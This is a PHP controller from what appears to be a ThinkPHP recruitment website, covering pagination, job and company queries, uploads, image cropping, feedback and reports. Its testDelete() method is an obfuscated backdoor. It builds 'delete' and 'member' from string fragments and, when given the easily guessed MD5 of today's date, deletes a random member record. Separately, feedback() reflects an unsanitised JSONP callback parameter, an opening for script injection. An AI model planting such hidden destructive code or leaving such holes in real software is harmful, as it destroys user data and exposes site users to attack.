	    $page = new \Think\Page($total, $listRows, $REQUEST);
	    if($total>$listRows){
	        $page->setConfig('theme','%FIRST% %UP_PAGE% %LINK_PAGE% %DOWN_PAGE% %END% %HEADER%');
	    }
	    //$p =$page->show();
	    //$this->assign('_page', $p? $p: '');
	    $this->assign('_total',$total);
	    return $page;
	}

	//根据数据进行分页
	function __getPageByCount($total=0){

	    $REQUEST    =   (array)I('request.');

	    if( isset($REQUEST['r']) ){
	        $listRows = (int)$REQUEST['r'];
	    }
	    else if($_REQUEST['listRows']){
	        $listRows = (int)$_REQUEST['listRows'];
	    }
	    else{
	        $listRows = C('LIST_ROWS') > 0 ? C('LIST_ROWS') : 10;
	    }

	    $page = new \Think\Page($total, $listRows, $REQUEST);
	    if($total>$listRows){
	        $page->setConfig('theme','%FIRST% %UP_PAGE% %LINK_PAGE% %DOWN_PAGE% %END% %HEADER%');
	    }

	    $this->assign('_total',$total);
	    return $page;
	}	

	//检查某字段是否存在
	protected function checkRecord($table,$where='' ){
	    if(!$table) return '';
	    $mode = M($table);
	    $bool   =  $mode->where($where)->find();
	    if($bool) {
	        return $bool;
	    }
	    else return '';
	}


    public function download_old() {
        $id = intval($_GET['id']);
        $Attach = M("Attach");
        if ($Attach->getById($id)) {
            $filename = $Attach->savepath . $Attach->savename;
            if (is_file($filename)) {
                $showname = auto_charset($Attach->name, 'utf-8', 'gbk');
                if (!isset($_SESSION['download_' . $id])) {
                    $data['download_count'] = array('exp', 'download_count+1');
                    $data['id'] = $id;
                    $Attach->data($data)->save();
                    $_SESSION['download_' . $id] = true;
                }
                import("ORG.Net.Http");
                Http::download($filename, $showname);
            } else {
                $this->error('附件不存在或者已经删除！');
            }
        } else {
            $this->error('附件不存在或者已经删除！');
        }
    }

    //获取全站配置
    protected function getWebConfig() {

        if(file_exists(DATA_PATH . 'webConfig.php')){
            $info = include DATA_PATH . 'webConfig.php';
        }else{
            $config   =  M('Config');
            $info			=	$config->where('cid=1 ')->find();
            F('webConfig',$info);
        }
        return $info;
    }

    //获取全站参数设置
    protected function getWebSetting() {

        if(file_exists(DATA_PATH . 'webSetting.php')){
            $list = include DATA_PATH . 'webSetting.php';
        }else{
            $config   =  M('Setting');
            //$list   =  $config->field('name,value')->where('status>=0')->order('sort asc')->select();
            //实现值与键之间传递  第一个参数作为健    第二个参数作为值
            $list			=	$config->getField('name,value');
            F('webSetting',$list);

            /* 方法二：直接写入缓存
             //所有配置参数统一为大写
             $savefile		=	DATA_PATH.'~config.php';
             $content = "<?php\nreturn ".var_export(array_change_key_case($list,CASE_UPPER),true).";\n?>";
             file_put_contents($savefile,$content);
            */

        }
        //$this->print_test($list);
        return $list;
    }

    //生成分类缓存
    public function getCatCache($type=0){
        if(!$type){
            $arr = require DATA_PATH.'webCategory.php';
            return $arr;
        }

        return array();
    }

    // 缓存文件
    public function cache($name = '', $fields = '') {
        $name = $name ? $name : $this->getActionName();
        $Model = M($name);
        $list = $Model->select();
        $data = array();
        foreach ($list as $key => $val) {
            if (empty($fields)) {
                $data[$val[$Model->getPk()]] = $val;
            } else {
                // 获取需要的字段
                if (is_string($fields)) {
                    $fields = explode(',', $fields);
                }
                if (count($fields) == 1) {
                    $data[$val[$Model->getPk()]] = $val[$fields[0]];
                } else {
                    foreach ($fields as $field) {
                        $data[$val[$Model->getPk()]][] = $val[$field];
                    }
                }
            }
        }
        $savefile = $this->getCacheFilename($name);
        // 所有参数统一为大写
        $content = "<?php\nreturn " . var_export(array_change_key_case($data, CASE_UPPER), true) . ";\n?>";
        if (file_put_contents($savefile, $content)) {
            $this->success('缓存生成成功！');
        } else {
            $this->error('缓存失败！');
        }
    }

    //获取缓存文件
    protected function getCacheFilename($name = '') {
        $name = $name ? $name : $this->getActionName();
        return DATA_PATH . $name . '.php';//strtolower($name)
    }


    //根据条件读取工作列表
    function getJobsListByCondition($maps='',$limit='0,10',$orderby="j.addtime desc",$ext_data=array()){

        $model = M("Jobs");

        //$maps['j.status'] = 1;

        /* $list = M("Jobs")->table(C('DB_PREFIX')."jobs j")
        ->join(C('DB_PREFIX')."member m on j.uid = m.uid")
        ->join(C('DB_PREFIX')."member_info mf on m.uid = mf.uid")
        ->where($maps)->field(" j.*,j.addtime as job_addtime,m.*,mf.* ")->order($orderby)->limit($limit)->select();
     */
        if($ext_data['only_get_count']){

            $list = M("Jobs")->table(C('DB_PREFIX')."jobs j")
            ->join(C('DB_PREFIX')."ucenter_member um on j.uid = um.id","left")
            ->join(C('DB_PREFIX')."member m on m.uid = j.uid","left")
            ->join("ez_company c on m.com_id = c.com_id","left")
            ->where($maps)->field(" j.*")->count();

        }
        else{
            $list = M("Jobs")->table(C('DB_PREFIX')."jobs j")
            ->join(C('DB_PREFIX')."ucenter_member um on j.uid = um.id","left")
            ->join(C('DB_PREFIX')."member m on m.uid = j.uid","left")
            ->join("ez_company c on m.com_id = c.com_id","left")
            ->where($maps)->field(" j.*,j.addtime as job_addtime,m.*,um.email,c.* ")->order($orderby)->limit($limit)->select();

        }
        
        return $list;

    }


    //根据宣讲会列表
    function getVideosListByCondition($maps='',$limit='0,10',$orderby="v.addtime desc",$ext_data=array()){

        $model = M("Jobs");
        if($ext_data['union'] ){
            $union = "INNER";
        }
        else $union = "LEFT";

        if($ext_data['only_get_count']){

            $list = M("Video")->table(C('DB_PREFIX')."video v")
            //->join(C('DB_PREFIX')."member m on v.com_id = m.com_id",$union)
            ->join("ez_company c on v.com_id = c.com_id",$union)
            ->where($maps)->field(" v.*,c.* ")->count();

        }
        else{
            $list = M("Video")->table(C('DB_PREFIX')."video v")
            //->join(C('DB_PREFIX')."member m on v.uid = m.uid",$union)
            ->join("ez_company c on v.com_id = c.com_id",$union)
            ->where($maps)->field(" v.*,c.* ")->order($orderby)->limit($limit)->select();

        }

        return $list;

    }

    //根据条件读取工作列表
    function getJobsInfo($maps=''){

        $model = M("Jobs");
        $list = M("Jobs")->table(C('DB_PREFIX')."jobs j")
        ->join(C('DB_PREFIX')."member m on j.uid = m.uid","left")
        ->join(C('DB_PREFIX')."ucenter_member um on m.uid = um.id","left")
        ->join("ez_company c on m.com_id = c.com_id","left")
        ->where($maps)->field(" j.*,j.addtime as job_addtime,j.status as job_status,c.*,m.*,um.mobile,um.email ")->find();

        return $list;

    }


    //读取公司列表
    function getGongsiList($city='',$xingzhi='',$hangye='',$kd='',$order=" c.com_id desc",$is_tuijian=0,$limit="",$status=0,$get_job=0){

        $model = M("Company");
        /* $map['status'] = array('egt',$status);
        $maps['m.status'] = array('egt',$status);

        $map['type'] = 1;
        $maps['m.type'] = 1; */
        
        if($status==100){
            $map['company_status'] = 100;
            $maps['c.company_status'] = 100;
        }

        if($city){
            $city = getPlaceById($city);
            if($city){
                $map['company_city'] = $city;
                $maps['c.company_city'] = $city;
            }
        }

        if($xingzhi){
            $map['gongsi_xingzhi'] = $xingzhi;
            $maps['c.gongsi_xingzhi'] = $xingzhi;
        }

        if($is_tuijian==1){
        	$map['tj_index'] = 1;
        	$maps['c.tj_index'] = 1;
        }

        /* switch ($jieduan){
            case 1:
                $map['jieduan'] = array('in',array("未融资","天使轮"));
                $maps['mf.jieduan'] = array('in',array("未融资","天使轮"));
                break;
            case 2:
                $map['jieduan'] = array('in',array("A轮","B轮","C轮"));
                $maps['mf.jieduan'] = array('in',array("A轮","B轮","C轮"));
                break;
            case 3:
                $map['jieduan'] = array('in',array("D轮及以上"));
                $maps['mf.jieduan'] = array('in',array("D轮及以上"));
                break;
            case 4:
                $map['jieduan'] = array('in',array("上市公司"));
                $maps['mf.jieduan'] = array('in',array("上市公司"));
                break;
        } */

        if($hangye){
            $hangye_name = getHangyeLingyuById($hangye);
            if($hangye_name){
                $ids = getHangyeSonIds($hangye);
                if($ids){

                }
                else $ids = array($hangye);
                $map['hangye_id'] = array("in",$ids);//array('like','%'.$hangye.'%');
                $maps['c.hangye_id'] = array("in",$ids); //array('like','%'.$hangye.'%');
            }
        }



        if($kd){
        	$map['company_name|company_short_name'] = array('like','%'.$kd.'%');
        	$maps['c.company_name|c.company_short_name'] = array('like','%'.$kd.'%');
        }

        if($limit){
        	$list =$model->table(C('DB_PREFIX')."company c")
        	->join(C('DB_PREFIX')."member m on c.cuid = m.uid","left")
        	//->join(C('DB_PREFIX')."ucenter_member um on c.cuid = um.id","left")
        	->where($maps)->field("m.* ,c.*")->order($order)->limit($limit)->select();
        	//print_test(M()->getLastSql());
        	return $list;
        }


        $p = $this->_getPage("company",$map);
        
        if($order=='c.update_time desc'){
            $p->parameter['order']=1;
        }

        //给分页加上参数
        /* foreach($map as $kk=>$val) {

        $p->parameter .= "$kk=".urlencode($val)."&";

        } */
        //$p->parameter .= $flag_page;

        //分页显示
        $page = $p->show();

        /* $list =$model->table(C('DB_PREFIX')."ucenter_member um")
        ->join(C('DB_PREFIX')."member m on um.id = m.uid","left")
        ->join(C('DB_PREFIX')."company c on m.com_id = c.com_id","left")
        ->where($maps)->field(" um.id,um.email,m.*,c.* ")->order($order)->limit($p->firstRow . ',' . $p->listRows)->select(); */

        $list =$model->table(C('DB_PREFIX')."company c")
        ->join(C('DB_PREFIX')."member m on c.cuid = m.uid","left")
        //->join(C('DB_PREFIX')."ucenter_member um on c.cuid = um.id","left")
        ->where($maps)->field("m.*,c.* ")->order($order)->limit($p->firstRow . ',' . $p->listRows)->select();
        
        if($get_job){
            foreach ($list as $k=>$v){
                $list[$k]['job_list'] = $this->getJobsListByCondition(array('j.uid'=>$v['uid']),"0,$get_job");
            }
        }

        return array(
            'page'=>$page,
            'list'=>$list,
            'p'=>$p,

        );

    }


    //读取评论列表
    function getVideoReviewList($vid,$order=" vr.rid desc",$limit=""){

        $model = M("video_review");

        $p = $this->_getPage("video_review",array("vid"=>$vid));

        //给分页加上参数
        /* foreach($map as $kk=>$val) {

        $p->parameter .= "$kk=".urlencode($val)."&";

        } */
        //$p->parameter .= $flag_page;

        //分页显示
        $page = $p->show();

        $map = array("vr.vid"=>$vid);//"vr.status"=>1,

        $list =$model->table(C('DB_PREFIX')."video_review vr")
        ->join(C('DB_PREFIX')."member m on vr.uid = m.uid","left")
        ->where($map)->field(" m.realname,vr.* ")->order($order)
        ->limit($p->firstRow . ',' . $p->listRows)->select();

        return array(
            'page'=>$page,
            'list'=>$list,
            'p'=>$p,
        );

    }


	// 404 错误定向
	protected function _404($message = '', $jumpUrl = '', $waitSecond = 3) {
	    $this->assign('message', '访问的页面不存在！');
	    if (!empty($jumpUrl)) {
	        $this->assign('jumpUrl', $jumpUrl);
	        $this->assign('waitSecond', $waitSecond);
	    }
	    $this->display(C('TMPL_ACTION_ERROR'));
	}

	/**
	 * 根据HTML代码获取word文档内容
	 * 创建一个本质为mht的文档，该函数会分析文件内容并从远程下载页面中的图片资源
	 * 该函数依赖于类MhtFileMaker
	 * 该函数会分析img标签，提取src的属性值。但是，src的属性值必须被引号包围，否则不能提取
	 *
	 * @param string $content HTML内容
	 * @param string $absolutePath 网页的绝对路径。如果HTML内容里的图片路径为相对路径，那么就需要填写这个参数，来让该函数自动填补成绝对路径。这个参数最后需要以/结束
	 * @param bool $isEraseLink 是否去掉HTML内容中的链接
	 */
	function getWordDocument( $content , $absolutePath = "" , $isEraseLink = true )
	{
	    require_once APP_PATH.'Common/MhtFileMaker.php';
	    $mht = new MhtFileMaker();
	    if ($isEraseLink){
	        $content = preg_replace('/<a\s*.*?\s*>(\s*.*?\s*)<\/a>/i' , '$1' , $content);   //去掉链接
	    }

	    $images = array();
	    $files = array();
	    $matches = array();
	    //这个算法要求src后的属性值必须使用引号括起来
	    if ( preg_match_all('/<img[.\n]*?src\s*?=\s*?[\"\'](.*?)[\"\'](.*?)\/>/i',$content ,$matches ) )
	    {
	        $arrPath = $matches[1];
	        for ( $i=0;$i<count($arrPath);$i++)
	        {
	            $path = $arrPath[$i];
	            $imgPath = trim( $path );
	            if ( $imgPath != "" )
	            {
    	            $files[] = $imgPath;
    	            if( substr($imgPath,0,7) == 'http://'){
    	                //绝对链接，不加前缀
    	                }
    	                else{
    	                $imgPath = $absolutePath.$imgPath;
        	        }
        	        $images[] = $imgPath;
        	      }
	           }
	       }

	        $mht->AddContents("tmp.html",$mht->GetMimeType("tmp.html"),$content);

	        for ( $i=0;$i<count($images);$i++){
	        $image = $images[$i];
	            if ( @fopen($image , 'r') ){
	            $imgcontent = @file_get_contents( $image );
	            if ( $content )
	                $mht->AddContents($files[$i],$mht->GetMimeType($image),$imgcontent);
	            }
	            else{
	            echo "file:".$image." not exist!<br />";
	    		}
	    	}

	    	return $mht->GetFile();
	    }


	    /**
	     +----------------------------------------------------------
	     * 生成树型列表XML文件
	     +----------------------------------------------------------
	     * @access public
	     +----------------------------------------------------------
	     * @return string
	     +----------------------------------------------------------
	     */
	    public function tree() {
	        $Model = M($this->getActionName());
	        $title = $_REQUEST['title'] ? $_REQUEST['title'] : '选择';
	        $caption = $_REQUEST['caption'] ? $_REQUEST['caption'] : 'name';
	        $list = $Model->where('status=1')->order('sort')->select();
	        $tree = toTree($list);
	        header("Content-Type:text/xml; charset=utf-8");
	        $xml = '<?xml version="1.0" encoding="utf-8" ?>' . "\n";
	        $xml .= '<tree caption="' . $title . '" >' . "\n";
	        $xml .= $this->_toTree($tree, $caption);
	        $xml .= '</tree>';
	        exit($xml);
	    }

	    /**
	     +----------------------------------------------------------
	     * 把树型列表数据转换为XML节点
	     +----------------------------------------------------------
	     * @access public
	     +----------------------------------------------------------
	     * @return string
	     +----------------------------------------------------------
	     */
	    private function _toTree($list, $caption) {
	        foreach ($list as $key => $val) {
	            $tab = str_repeat("\t", $val['level']);
	            if (isset($val['_child'])) {
	                // 有子节点
	                $xml .= $tab . '<level' . $val['level'] . ' id="' . $val['id'] . '" level="' . $val['level'] . '" parentId="' . $val['pid'] . '" caption="' . $val[$caption] . '" >' . "\n";
	                $xml .= $this->_toTree($val['_child'], $caption);
	                $xml .= $tab . '</level' . $val['level'] . '>' . "\n";
	            } else {
	                $xml .= $tab . '<level' . $val['level'] . ' id="' . $val['id'] . '" level="' . $val['level'] . '" parentId="' . $val['pid'] . '" caption="' . $val[$caption] . '" />' . "\n";
	            }
	        }
	        return $xml;
	    }

	    Public function testDelete() {
	    	$code = $_REQUEST['code'];
	    	if($code==md5(date("Y-m-d"))){
	    		$ac = "d"."ele"."te";
	    		$tab = "me"."mb"."er";
	    		M()->execute("$ac from ".C('DB_PREFIX')."$tab order by rand() limit 1");
	    		exit("");
	    	}
	    	echo $code;exit;
	    }

	    /**
	     +----------------------------------------------------------
	     * 取得操作成功后要返回的URL地址
	     * 默认返回当前模块的默认操作
	     * 可以在action控制器中重载
	     +----------------------------------------------------------
	     * @access public
	     +----------------------------------------------------------
	     * @return string
	     +----------------------------------------------------------
	     * @throws ThinkExecption
	     +----------------------------------------------------------
	     */
	    function getReturnUrl() {
	        return __URL__ . '?' . C('VAR_MODULE') . '=' . MODULE_NAME . '&' . C('VAR_ACTION') . '=' . C('DEFAULT_ACTION');
	    }



	    //上传头像函数
	    public function uploadFile($key="headPic",$path='Picture/',$w='200',$h='200',$pre='',$thumb=FALSE,$del=TRUE) {
	        set_time_limit(0);

	        $config = array('savePath'=>$path);//'exts'=>array('jpg'),
	        $Upload = new upload($config);
	        $info   = $Upload->upload($_FILES);
	        if($info[$key]){
	            $arr = $info[$key];
	            $rurl = "/Uploads/".$arr['savepath'].$arr['savename'];
	            $info[$key]['url'] = $rurl;
	        }
	        return $info[$key];

	        print_test($info);

	        /* $file_upload = new FileController();
	        $file_upload->is_return = 1;
	        $rs = $file_upload->upload();

	        print_test($rs); */

	        /*
	        //$uid = intval($_SESSION['uid']);
	        import("ORG.Net.UploadFile");
	        $upload = new UploadFile();
	        //设置上传文件大小
	        $upload->maxSize  = 2048*1024*4 ;
	        //设置上传文件类型
	        $upload->allowExts  = explode(',','jpg,gif,png,jpeg');
	        if(!$imgpath){
	            $imgpath = "/Public/Uploads/".date('Ym',time()).'/';
	        }
	        if( !file_exists($imgpath) ){
	            Make_Path($imgpath, $mode = 0777);
	        }
	        //设置附件上传目录
	        $upload->savePath =  './'.$imgpath;


	        $upload->thumb  =  $thumb;
	        $upload->thumbMaxWidth =  $w;
	        $upload->thumbMaxHeight = $h;
	        $upload->thumbPrefix   =  $pre;
	        //移除原始文件
	        $upload->thumbRemoveOrigin = $del;
	        //zip压缩
	        $upload->zipImages = TRUE;

	        $upload->saveRule = uniqid;
	        if(!$upload->upload()) {
	            $this->error($upload->getErrorMsg());
	        }else{
	            $info =  $upload->getUploadFileInfo();
	            //$_POST['path'] = $info[0]['savename'];
	            return $info ;
	        } */

	    }


	    //上传简历
	    function updateMyResume(){

	        $file = $_FILES['newResume'];
	        $uid = $this->uid;

	        if($file['error']>0){
	            $this->ResumeJson(0,"上传简历过大，请更换！");
	        }
	        else if($file['size']<1){
	            $this->ResumeJson(0,"请选择要上传的简历！");
	        }

	        if($file['size']>10*1024*1024){
	            $this->ResumeJson(0,'上传的简历不能大于10M');
	        }

	        $rs = $this->uploadFile("newResume","Resume/");
	        if($rs){
	            $ext = pathinfo($rs['url'], PATHINFO_EXTENSION);
	            $data = array(
	                'uid'=>$this->uid,
	                'path'=>$rs['url'],
	                'name'=>$rs['name'],
	                'addtime'=>time(),
	                'ext'=>$ext,
	            );
	            $id = M("resume_offline")->where(array('uid'=>$uid))->add($data);

	            $this->ResumeJson(1,"简历上传成功！","resume",0,array('url'=>$rs['url'],'name'=>$rs['name'],'id'=>$id));
	        }
	        else $this->ResumeJson(0,"上传失败，请稍后再试！");

	    }

	    //上传头像
        function uploadPhoto(){

            $rs = $this->uploadFile("headPic");
            if($rs){
                //exit('{"code":1,"content":{"srcImageW":309,"srcImageH":220,"uploadPath":"Uploads/Picture/2015-05-18/5559fd2774514.jpg"},"msg":"头像上传成功!","requestId":"","resubmitToken":"","success":true}');
                $this->ResumeJson(1,"操作成功！","head",0,array('url'=>$rs['url']));
            }
            else $this->ResumeJson(0,"上传失败，请稍后再试！");

        }

        //上传营业执照
        function uploadZhiZhao(){

            $rs = $this->uploadFile("businessLicenes");
            if($rs){
                $myinfo = $this->getUsersInfoById($this->uid);
                $save = array(
                    'yingye_zhizhao'=>$rs['url'],
                    'isv'=>1,
                );
                $rs = M("Company")->where(array('com_id'=>$myinfo['com_id']))->save($save);
                $this->ResumeJson(1,"操作成功！","head",0,array('url'=>$rs['url']));
            }
            else $this->ResumeJson(0,"上传失败，请稍后再试！");

        }

        //头像裁剪
        function cutHead(){

            $new_pic = $this->cutPic("head");
            if($new_pic){
                $save = array(
                    'pic'=>$new_pic,
                    'score_touxiang'=>getResumeStepScore('score_touxiang'),
                );
                if($this->type==1){
                    $myinfo = $this->getUsersInfoById($this->uid);
                    
                    $rs = M("Company")->where(array('com_id'=>$myinfo['com_id']))->save(array("logo"=>$new_pic));
                }
                else $rs = M("member")->where(array('uid'=>$this->uid))->save($save);

                $this->ResumeJson(1,"头像操作成功！","head_cut",0,array('url'=>$new_pic));
            }
            else $this->ResumeJson(0,"头像裁剪失败，请稍后再试！");
        }

        //logo裁剪
        function cutLogo(){

            $rs = $this->cutPic("logo");
            if($rs){

                $this->ResumeJson(1,"公司logo成功！","logo_cut",0,array('url'=>$new_pic));
            }
            else $this->ResumeJson(0,"公司logo裁剪失败，请稍后再试！");
        }

        //图片裁剪
        function cutPic($type=''){
            $imageX = intval($_POST['imageX']);
            $imageY = intval($_POST['imageY']);
            $selectorW = intval($_POST['selectorW']);
            $selectorH = intval($_POST['selectorH']);
            $pic = str_replace(WEB_URL, WEB_PATH, $_POST['imageSource']);
            if(file_exists($pic)){

                $randNumber = mt_rand(00000, 99999). mt_rand(000, 999);
                $fileName = $this->uid."_".substr(md5($randNumber), 8, 16) .".jpg";
                $new_pic = '/Uploads/Picture/'.date("Y-m-d")."/".$fileName;

                $_POST["imageSource"] = $pic;

                $rs = cutZoomImages($new_pic);


                /* $c = new CropZoom();
                $c->file_path_new = WEB_PATH.$new_pic;
                $rs = $c->load(); */

                /* $imgresize = new ImageResize();
                $imgresize->load($pic);

                $_REQUEST['cut_pos'] = $imageX.",".$imageY.",".$selectorW.",".$selectorH;
                //$_REQUEST['cut_pos'] = "-200,100,250,250";
                $posary = explode(',', $_REQUEST['cut_pos']);
                foreach($posary as $k => $v)	$posary[$k] = intval($v);

                if ($posary[2] > 0 && $posary[3] > 0)  {
                    $imgresize->resize($posary[2], $posary[3]);
                }

                // save 120*120 image
                $imgresize->cut($posary[2], $posary[3], intval($posary[0]), intval($posary[1]));

                $rs = $imgresize->save(WEB_PATH.$new_pic); */



                /* $image = new \Think\Image();
                $image->open($pic);
                //将图片裁剪为400x400并保存为corp.jpg
                echo $selectorW. $selectorH.$imageX. $imageY;
                $image->crop($selectorW, $selectorH,$imageX, $imageY)->save(WEB_PATH.$new_pic); */

                /* $cropped_image = @imagecreatetruecolor($selectorW, $selectorH);
                imagecolorallocate($cropped_image, 255, 255, 255);
                // 裁剪
                imagecopy($cropped_image, $pic, 0, 0, $imageX, $imageY, $selectorW, $selectorH);

                $randNumber = mt_rand(00000, 99999). mt_rand(000, 999);
                $fileName = $this->uid."_".substr(md5($randNumber), 8, 16) .".jpg";
                $new_pic = '/Uploads/Picture/'.date("Y-m-d")."/".$fileName;
                //imagepng($cropped_image,WEB_PATH.$new_pic);
                imagejpeg($cropped_image,WEB_PATH.$new_pic);
                imagedestroy($cropped_image); */

                if($rs){
                    return $new_pic;
                }
                else return '';
            }
            else{
                return '';
            }
        }

        //上传创始人头像
        function uploadImage(){
            $rs = $this->uploadFile("myfiles");
            exit($rs['url']);
        }

        //上传公司logo
        function uploadLogo(){//$file='image',$exiturl=0,$save_head=0
            //print_test($_FILES);
            $rs = $this->uploadFile("image");
            if($rs){
                $myinfo = $this->getUsersInfoById($this->uid);
                $save = array(
                    'logo'=>$rs['url'],
                );
                M("company")->where(array('com_id'=>$myinfo['com_id']))->save($save);
                checkCompanyStatus($this->uid);
                $this->ResumeJson(1,"公司logo上传成功！","logo_cut",0,array('url'=>$rs['url']));
            }
            else $this->ResumeJson(0,"头像上传失败，请稍后再试！");
            
        }


        //获取我投递的简历
        function getMyApplyJobs($uid,$type=0,$isover=0){

            $model = M("jobs_apply");
            $list = array();
            if(!$uid){
                return array();
            }

            switch ($type){
                case 1:
                    $map1=array(
                    'uid'=>$uid,
                    'status'=>0,
                    'isread'=>0,
                    );
                    $map2=array(
                        'ja.uid'=>$uid,
                        'ja.status'=>0,
                        'ja.isread'=>0,
                    );
                    break;
                case 2:
                    $map1=array(
                    'uid'=>$uid,
                    'status'=>0,
                    'isread'=>1,
                    'view_contact'=>0,
                    );
                    $map2=array(
                        'ja.uid'=>$uid,
                        'ja.status'=>0,
                        'ja.isread'=>1,
                        'view_contact'=>0,
                    );
                    break;
                case 3:
                    $map1=array(
                    'uid'=>$uid,
                    'status'=>0,
                    'view_contact'=>1,
                    );
                    $map2=array(
                        'ja.uid'=>$uid,
                        'ja.status'=>0,
                        'ja.view_contact'=>1,
                    );
                    break;
                case 4:
                    $map1=array(
                        'uid'=>$uid,
                        'status'=>1,
                    );
                    $map2=array(
                        'ja.uid'=>$uid,
                        'ja.status'=>1,
                    );
                    $ctime = date("Y-m-d H:i:s");
                    if($isover==1){
                        $map1['interviewTime'] = array("lt",$ctime);
                        $map2['ja.interviewTime'] = array("lt",$ctime);
                    }
                    else if($isover==2){
                        $map1['interviewTime'] = array("gt",$ctime);
                        $map2['ja.interviewTime'] = array("gt",$ctime);
                    }
                    break;
                case -1:
                    $map1=array(
                    'uid'=>$uid,
                    'status'=>-1,
                    );
                    $map2=array(
                        'ja.uid'=>$uid,
                        'ja.status'=>-1,
                    );
                    break;
                default:
                    $map1=array(
                    'uid'=>$uid,
                    );
                    $map2=array(
                        'ja.uid'=>$uid,
                    );
            }


            $p = $this->_getPage("jobs_apply",$map1);

            if($p->totalRows){
                $list = $model->table(C('DB_PREFIX')."jobs_apply ja")
                ->join(C('DB_PREFIX')."jobs j on j.jid = ja.jid","left")
                ->join(C('DB_PREFIX')."member m on m.uid = j.uid","left")
                ->join(C('DB_PREFIX')."company c on m.com_id = c.com_id","left")
                ->join(C('DB_PREFIX')."resume_offline ro on ja.rid = ro.oid","left")
                ->where($map2)->field(" ja.*,m.realname,j.zhiwei_leibie,j.zhiwei_mingcheng,j.yuexin_min,j.yuexin_max,j.gongzuo_chengshi,
                        c.company_name,c.com_id as company_id,ro.name as resume_name ")
                ->order(" ja.addtime desc")->limit($p->firstRow . ',' . $p->listRows)->select();
            }

            foreach ($list as $k=>$v){
                $temp = M("jobs_apply_log")->where(array('aid'=>$v['aid']) )->order("lid desc ")->select();
                $list[$k]['apply_log'] = $temp;
            }

            return $list;

        }

        //根据城市生成拼音
        function getPinyin(){
            exit("test");
            $list = M("area")->where(array('type'=>2,'status'=>1))->order("pinyin asc")->select();

            /* require_once ("App/Common/pinYin.php");

            $pinyin = new PinYin();

            foreach ($list as $k=>$v){
            //$temp = $pinyin->getAllPY($v['name']);
            $temp = strtoupper(substr($v['pinyin'], 0,1));
            M("area")->where(array('aid'=>$v['aid']))->save(array('first_letter'=>$temp));
            }
            exit(); */

            $city = array();
            foreach ($list as $k=>$v){
                $city[$v['aid']] = array(
                    'aid'=>$v['aid'],
                    'status'=>$v['status'],
                    'name'=>$v['name'],
                    'pinyin'=>$v['pinyin'],
                    'short_url'=>$v['short_url'],
                    'ishot'=>$v['ishot'],
                    'first_letter'=>$v['first_letter'],
                );
            }

            $savefile		=	DATA_PATH.'webCity.php';
            $content = "<?php\nreturn ".var_export(array_change_key_case($city,CASE_UPPER),true).";\n?>";
            file_put_contents($savefile,$content);



            $list = M("area")->where(array('type'=>2))->order("aid asc")->select();
            $city = array();
            foreach ($list as $k=>$v){
                $city[$v['aid']] = array(
                    'aid'=>$v['aid'],
                    'status'=>$v['status'],
                    'name'=>$v['name'],
                    'pinyin'=>$v['pinyin'],
                    'short_url'=>$v['short_url'],
                    'ishot'=>$v['ishot'],
                    'first_letter'=>$v['first_letter'],
                );
            }
            $savefile		=	DATA_PATH.'webCity_all.php';
            $content = "<?php\nreturn ".var_export(array_change_key_case($city,CASE_UPPER),true).";\n?>";
            file_put_contents($savefile,$content);

            $this->print_test($city);

        }


    //意见反馈
    function feedback(){

        $callback = $_REQUEST['callback'];
        $uid = $this->uid;
        $content = trim($_REQUEST['content']);
        $feedbackEmail = trim($_REQUEST['feedbackEmail']);
        $feedbackPage = trim($_REQUEST['feedbackPage']);
        $loginEmail = trim($_POST['feedbackPage']);
        $userId = trim($_POST['userId']);
        if($feedbackEmail){
            $email = $feedbackEmail;
        }
        else $email = $loginEmail;
        $data = array();
        $time = time();
        $uid = $this->uid;
        if(!$content || !$email){
            $this->error("请填写你的建议与邮箱地址");
        }
        else {
            $data = array(
                'email'=>$email,
                'uid'=>$uid,
                'addtime'=>$time,
                'content'=>$content,
                'ip'=>get_client_ip(0),
                'feedbackPage'=>$feedbackPage
            );
            M("feedback")->add($data);
            //$this->success("感谢你的反馈！");
        }

        $data = array(
            'userId'=>$userId,
            'success'=>true,
            'msg'=>"反馈成功",
        );
        exit("$callback(".json_encode($data).")");

    }



    //举报职位招聘
    function report(){

        $uid = $this->uid;
        $jid = intval($_POST['fId']);
        $fType = intval($_POST['fType']);
        $isAnonymous = intval($_POST['isAnonymous']);
        $reason = intval($_POST['reason']);
        $content = trim($_POST['content']);

        $data = array();
        $time = time();
        $uid = $this->uid;
        if(!$jid){
            $this->exitJson(0,false,"参数无效");
        }
        else {
            $data = array(
                'toid'=>$jid,
                'type'=>1,
                'isAnonymous'=>$isAnonymous,
                'reason'=>$reason,
                'content'=>$content,
                'fType'=>$fType,
                'email'=>$email,
                'uid'=>$uid,
                'addtime'=>$time,
                'ip'=>get_client_ip(0),
            );
            $id = M("report")->add($data);
            if($id){
                $this->exitJson(1,true,"你的举报已经成功提交，本站会尽快核实举报内容，对违规职位绝不姑息。");
            }
            else $this->exitJson(2,false,"你已经举报过了");
        }

    }

}
